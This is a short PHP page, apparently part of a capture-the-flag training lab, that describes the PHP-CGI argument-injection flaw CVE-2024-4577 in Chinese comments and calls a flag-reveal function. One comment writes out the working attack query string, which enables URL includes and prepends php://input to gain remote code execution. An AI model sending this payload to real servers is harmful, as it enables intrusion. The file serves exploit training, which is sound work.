<?php
// 漏洞：PHP-CGI 参数注入（CVE-2024-4577）
// 攻击：?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
echo "PHP-CGI 漏洞利用";
echo "<p>攻击者可注入 php.ini 配置实现 RCE</p>";
require_once __DIR__ . '/../../../../app/bootstrap_challenge.php';
xxr_flag_reveal('phpweak');
